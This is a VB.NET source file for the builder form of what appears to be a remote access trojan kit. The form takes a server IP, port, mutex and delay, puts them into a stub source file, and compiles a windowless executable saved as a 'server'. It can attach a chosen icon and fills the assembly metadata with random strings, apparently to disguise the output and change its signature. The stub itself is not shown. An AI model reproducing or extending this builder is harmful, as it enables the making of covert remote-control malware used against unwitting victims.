Imports System.Threading
Imports System.IO
Imports System.CodeDom.Compiler
Imports System.Text

Public Class frmBuild
    Implements IMessageFilter
    Dim compileserver As Thread
    Dim icnpath As String
    Public Const WM_DROPFILES As Integer = 563

    Private Declare Function DragAcceptFiles Lib "shell32.dll" (ByVal hwnd As IntPtr, ByVal accept As Boolean) As Long
    Private Declare Function DragQueryFile Lib "shell32.dll" (ByVal hdrop As IntPtr, ByVal ifile As Integer, ByVal fname As StringBuilder, ByVal fnsize As Integer) As Integer
    Private Declare Sub DragFinish Lib "Shell32.dll" (ByVal hdrop As IntPtr)

    Sub New()

        InitializeComponent()
        Application.AddMessageFilter(Me)
        DragAcceptFiles(Me.Handle, True)
    End Sub

    Private Sub ChangeFont(ByVal container As Control)
        For Each ctrl As Control In container.Controls
            ' Change font for the control
            ctrl.Font = New Font("Comic Sans MS", 9, FontStyle.Regular)

            ' If the control has children, recursively change their fonts
            If ctrl.HasChildren Then
                ChangeFont(ctrl)
            End If
        Next
    End Sub

#Region "Builder"
    Private Sub RandomPool1_CharacterSelection(ByVal s As Object, ByVal c As Char)
        tb_mutex.Text += c.ToString()
    End Sub
    Public Function PreFilterMessage(ByRef m As System.Windows.Forms.Message) As Boolean Implements IMessageFilter.PreFilterMessage
        If m.Msg = WM_DROPFILES Then
            Dim nfiles As Integer = DragQueryFile(m.WParam, -1, Nothing, 0)
            Dim i As Integer
            For i = 0 To nfiles
                Dim sb As StringBuilder = New StringBuilder(256)
                DragQueryFile(m.WParam, i, sb, 256)
                HandleDroppedFiles(sb.ToString())
            Next
            DragFinish(m.WParam)
            Return True
        End If
        Return False
    End Function
    Public Sub HandleDroppedFiles(ByVal file As String)
        If Len(file) > 0 Then
            LoadPicture(file)
        End If
    End Sub


    Sub compilestub(ByVal sfdfilename As String)
        Try
            TextBox1.Text = TextBox1.Text & (Gettime() & "Stating Complile..." & vbCrLf)
            Dim cleansource As String

            Dim src As String = "source.vb"
            If Me.RadioButton1.Checked Then
                src = "source.vb"
            ElseIf Me.RadioButton2.Checked Then
                src = "source.cs"
            Else
                'src = "source.java"
            End If
            ' Reading source code from file
            Using textReader As New StreamReader(Path.Combine(Application.StartupPath, src))
                cleansource = textReader.ReadToEnd()
            End Using

            ' Logging reading status
            TextBox1.AppendText(Gettime() & "Reading Stub..." & vbCrLf)

            ' Replace placeholders with actual values
            cleansource = cleansource.Replace("SERVER-IP", tb_ip.Text) _
                                     .Replace("10002", NumericUpDown2.Value.ToString()) _
                                     .Replace("SINGLE_INSTANCE_APP_MUTEX", tb_mutex.Text) _
                                     .Replace("10001", txtDelay.Text) _
                                     .Replace("3.5.2.4", tb_assemblyversion.Text) _
                                     .Replace("0.0.0.0", tb_assemblyfileversion.Text)

            ' Logging compilation status
            TextBox1.AppendText(Gettime() & "Compiling Stub..." & vbCrLf)

            ' Compiler parameters
            Dim objCompilerParameters As New CompilerParameters() With {
                .GenerateExecutable = True,
                .OutputAssembly = sfdfilename,
                .CompilerOptions = "/target:winexe"
            }

            ' Adding referenced assemblies
            Dim referencedAssemblies As String() = {
                "System.dll",
                "System.Windows.Forms.dll",
                "Microsoft.VisualBasic.dll",
                "System.Management.dll",
                "System.Drawing.dll",
                "System.ServiceProcess.dll"
            }

            objCompilerParameters.ReferencedAssemblies.AddRange(referencedAssemblies)

            ' Add icon file if it exists
            If PictureBox1.Image IsNot Nothing Then
                objCompilerParameters.CompilerOptions &= " /win32icon:" & icnpath
            End If

            ' Compile the source code
            Dim codeProvider As New VBCodeProvider()
            Dim objCompileResults As CompilerResults = codeProvider.CompileAssemblyFromSource(objCompilerParameters, cleansource)

            ' Check for compilation errors
            If objCompileResults.Errors.HasErrors Then
                Dim errorString As New StringBuilder("Compiler error:")
                For Each [error] As CompilerError In objCompileResults.Errors
                    errorString.AppendLine([error].ToString())
                Next
                MsgBox(errorString.ToString(), MsgBoxStyle.OkOnly, "Error while compiling")
            Else
                ' Logging success status
                TextBox1.AppendText(Gettime() & "Stub Compiled and saved at " & sfdfilename & vbCrLf)
                TextBox1.ScrollToCaret()
            End If

        Catch ex As Exception
            MsgBox("Error: " & ex.Message)
        End Try


    End Sub
    Function Gettime()
        Return "[" & My.Computer.Clock.LocalTime.Hour & ":" & My.Computer.Clock.LocalTime.Minute & ":" & My.Computer.Clock.LocalTime.Second & "] "
    End Function


    Function Generate(ByVal len As Integer) As String
        Dim pool() As String = {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", _
                                "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", _
                                "r", "s", "t", "u", "v", "w", "x", "y", "z"}
        Dim chars As String = Nothing
        For i = 0 To len
            chars += pool(Rnd() * 61)
        Next
        Return chars
    End Function
    Public Function LoadPicture(ByVal File As String) As Boolean
        Dim i As New FileInfo(File)
        If Not i.Extension = ".ico" Then
            Label18.Text = "Please select an Icon!"
            LoadPicture = False
        Else
            PictureBox1.ImageLocation = File
            icnpath = File
            Label18.Text = " Drag & Drop here"
            LoadPicture = True
        End If
    End Function

#End Region
    Private Sub btn_build_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_build.Click
        Try
            Dim sfd As New SaveFileDialog
            With sfd
                .Filter = "Executables | *.exe"
                .InitialDirectory = Application.StartupPath
                .Title = "Save server..."
                Dim res = .ShowDialog()
                If Not res = Windows.Forms.DialogResult.OK Then
                    Exit Sub
                End If
            End With

            compileserver = New Thread(Sub() compilestub(sfd.FileName))
            compileserver.Start()

            MsgBox("Compiled Succesfully!" & vbCrLf & sfd.FileName)
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub btn_generate_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_generate.Click
        tb_assemblycompany.Text = Generate(10)
        tb_assemblycopyright.Text = Generate(10)
        tb_assemblydescription.Text = Generate(10)
        tb_assemblyproduct.Text = Generate(10)
        tb_assemblytitle.Text = Generate(10)
        tb_assemblytrademark.Text = Generate(10)
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        tb_mutex.Text = Generate(30)
    End Sub

    Private Sub frmBuild_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        ChangeFont(Me)
    End Sub


End Class